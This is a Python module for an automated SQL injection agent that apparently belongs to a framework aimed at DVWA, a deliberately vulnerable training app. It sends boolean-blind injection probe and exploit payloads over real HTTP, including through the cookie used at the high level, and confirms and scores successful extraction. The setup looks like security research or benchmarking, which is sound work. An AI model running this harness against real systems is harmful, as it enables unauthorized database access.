"""SQLi Boolean-based blind injection agent with real HTTP execution."""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import quote

from agents.agent_telemetry import exploit_event, probe_event, score_event
from foundation.http_client import http_accounted, request_scope
from agents.state_utils import (
    agent_visit_gate,
    candidate_payloads_for_stage,
    chain_check as _chain_check,
    graph_visit,
    make_update,
    merge_probe_observations,
    normalize_security_level,
    previously_executed_exploit_payloads,
    probe_outcome_update,
    probe_stage_blocked_update,
    resolve_stage_control_payloads,
    visit_block_update,
)
from foundation.control_catalog import quarantine_update
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession, session_fingerprint
from foundation.verifier import complementary_boolean_payload, usable_blind_response

logger = logging.getLogger(__name__)

AGENT_ID = "sqli_boolean_blind"
MODULE_PATH = "/vulnerabilities/sqli_blind/"
HIGH_RESULT_PATH = MODULE_PATH
_PROBE_OBSERVATION_KEY = "response_diff_detectable"

_TRUTHY_SIGNAL = "user id exists in the database"
_FALSY_SIGNAL = "user id is missing from the database"


def _request_high_via_cookie(session: DVWASession, payload: str):
    """DVWA's high blind module reads id from a cookie, not the SQLi session."""
    session.http.set_cookie("id", quote(payload, safe=""))
    return session.get(MODULE_PATH)


def _request(session: DVWASession, security_level: str, payload: str):
    """Submit a SQLi form using the method exposed by the DVWA level."""
    request_data = {"id": payload, "Submit": "Submit"}
    if security_level == "medium":
        return session.post(MODULE_PATH, data=request_data)
    if security_level == "high":
        return _request_high_via_cookie(session, payload)
    return session.get(MODULE_PATH, params=request_data)


@http_accounted(role="detection_control", method=AGENT_ID)
def _probe_preconditions(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "low",
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send truthy/falsy payload pairs to detect boolean-blind signal difference.

    Returns (precondition_met, tried_payloads, observations, telemetry_events).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    sent_any = False

    truthy_resp: str | None = None
    falsy_resp: str | None = None

    for payload in payloads:
        if payload in already_tried:
            continue
        sent_any = True
        tried.append(payload)
        try:
            resp = _request(session, security_level, payload)
            usable = usable_blind_response(resp, allow_missing="1=2" in payload)
            events.append(probe_event(AGENT_ID, payload, resp.status_code, False, response=resp))
            if not usable:
                continue
            lower_text = resp.text.lower()
            if "1=1" in payload:
                truthy_resp = lower_text
            elif "1=2" in payload:
                falsy_resp = lower_text
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, payload, None, False))

    # Detect difference between truthy and falsy responses
    if truthy_resp is not None and falsy_resp is not None:
        if (_TRUTHY_SIGNAL in truthy_resp and _FALSY_SIGNAL not in truthy_resp
                and _FALSY_SIGNAL in falsy_resp and _TRUTHY_SIGNAL not in falsy_resp):
            for event in events:
                if event["payload"]["status_code"] is not None:
                    event["payload"].update(signal_detected=True, verified_grade=1, verification_reason="verified_boolean_probe_pair")
            observations[_PROBE_OBSERVATION_KEY] = True
            return True, tried, observations, events

    if not sent_any:
        # Don't overwrite prior observation if we didn't send any requests
        return False, tried, {}, events
    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events


@http_accounted(phase="method", role="candidate", method=AGENT_ID)
def _attempt_exploit(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "high",
) -> tuple[int, list[str], list[str], list[dict]]:
    """Try boolean-blind exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0
    repeatable_conditions = 0
    repeatable_payloads: set[str] = set()
    required_confirms = 1 if security_level == "medium" else 2

    def branch(response):
        if not usable_blind_response(response, allow_missing=True):
            return None
        body = response.text.lower()
        if _TRUTHY_SIGNAL in body and _FALSY_SIGNAL not in body:
            return True
        if _FALSY_SIGNAL in body and _TRUTHY_SIGNAL not in body:
            return False
        return None

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        candidate_id = getattr(payload, "candidate_id", None)
        try:
            resp = _request(session, security_level, payload)
            observed = branch(resp)
            event = exploit_event(AGENT_ID, payload, resp.status_code, observed is True, response=resp)
            events.append(event)
            if observed is None:
                continue
            if observed is False:
                # DVWA suppresses SQL exceptions into the same missing-ID body.
                # Negating this expression must produce a true branch before
                # its false result can receive any extraction credit.
                control_payload = complementary_boolean_payload(payload)
                if control_payload is None:
                    continue
                control_id = f"control:{candidate_id}:complementary" if candidate_id else None
                try:
                    with request_scope(role="candidate_verification"):
                        control = _request(session, security_level, control_payload)
                except Exception as exc:
                    logger.warning("[%s] Complementary control failed: %s", AGENT_ID, exc)
                    events.append(probe_event(AGENT_ID, control_payload, None, False,
                        control_id=control_id, source_candidate_id=candidate_id,
                        validation_relation="complementary_boolean" if candidate_id else None))
                    continue
                evaluates = branch(control) is True
                events.append(probe_event(AGENT_ID, control_payload, control.status_code, evaluates,
                    response=control, control_id=control_id, source_candidate_id=candidate_id,
                    validation_relation="complementary_boolean" if candidate_id else None))
                if not evaluates:
                    continue
                event["payload"]["control_payload"] = control_payload
                event['payload']['success'] = True
                event['status'] = 'ok'
            event["payload"].update(verified_grade=2, verification_reason="evaluated_boolean_branch")
            score = max(score, 2)
            # An evaluated branch carries information only if it repeats.
            repeated = _request(session, security_level, payload)
            consistent = branch(repeated) is observed
            events.append(exploit_event(AGENT_ID, payload, repeated.status_code, consistent, response=repeated))
            if consistent:
                repeatable_payloads.add(payload)
                events[-1]["payload"].update(verified_grade=2, verification_reason="repeatable_boolean_branch")
                repeatable_conditions += 1
                if repeatable_conditions >= required_confirms:
                    score = 3
                    for verified in events:
                        if verified["event"] == "agent.exploit.sent" and verified["payload"]["payload"] in repeatable_payloads and verified["payload"].get("verified_grade") == 2:
                            verified["payload"].update(verified_grade=3, verification_reason="verified_repeatable_boolean_extraction")
                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                    break
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

    return score, tried, confirmed, events

def sqli_boolean_blind_agent(state: ExploitationState) -> dict[str, Any]:
    """Execute the SQL injection boolean-blind static method agent.

    Reads validated candidate queues, target configuration, prior attempts, and
    response-difference observations. The agent compares true and false payload
    responses over HTTP, records evidence for detectable response deltas,
    confirms `sqli_boolean_blind_confirmed` when exploitation evidence is
    observed, and performs shared chain scoring after confirmation.

    Args:
        state: Current shared LangGraph state.

    Returns:
        Partial state update for observations, tried payloads, scores,
        confirmed vulnerabilities, achieved outcomes, and telemetry events.
    """
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])
    visit_gate = agent_visit_gate(state, AGENT_ID)
    if not visit_gate["allow"]:
        return visit_block_update(state, AGENT_ID, stop=visit_gate["stop"], gate=visit_gate["gate"])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
                execution_failure_code="SESSION_LOGIN_FAILED",
            )
        session.set_security_level(security_level)

        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE (frozen detection controls only)
        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe")
        principal_id = getattr(session, "_principal_id", None) or getattr(session, "_username", None)
        probe_payloads = resolve_stage_control_payloads(state, AGENT_ID, probe_payloads, principal_id)
        if graph_visit(state, AGENT_ID) and not probe_payloads:
            return probe_stage_blocked_update(state, AGENT_ID)
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session, probe_payloads, set(), security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)
        probe_update, quarantine = probe_outcome_update(
            state, AGENT_ID, observations, probe_events, principal_id=principal_id,
            session_fingerprint=session_fingerprint(session))
        if quarantine:
            blocked = quarantine_update(
                state, method=AGENT_ID, visit_id=state.get("selected_visit_id"),
                control_id=f"{AGENT_ID}:probe:control", control_class="detection",
                reason=quarantine, detail="detection control exceeded its evidence role",
                evidence_refs=[f"control:{AGENT_ID}"],
                snapshot=probe_update.get("probe_controls", {}).get(AGENT_ID))
            blocked.update(visit_block_update(
                state, AGENT_ID, stop="quarantine",
                gate={"reason": quarantine, "evidence_refs": []}))
            blocked["telemetry_events"] = [*telemetry_events, *blocked.get("telemetry_events", [])]
            return blocked
        probe_status = (probe_update.get("precondition_status") or {}).get(_PROBE_OBSERVATION_KEY)
        if probe_status != "true":
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
                default_candidate_stop_reason=(
                    "precondition_false" if probe_status == "false" else "precondition_unknown"),
            )
            update.update(probe_update)
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT (own current-visit candidate requests only)
        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit")
        exploit_done = previously_executed_exploit_payloads(
            state, AGENT_ID, state.get("selected_visit_id"))

        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
            session, all_exploit, exploit_done, security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            telemetry_events=telemetry_events,
        )
        merge_probe_observations(update, probe_update, state, observations)
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
            execution_error=exc,
        )
    finally:
        session.close()
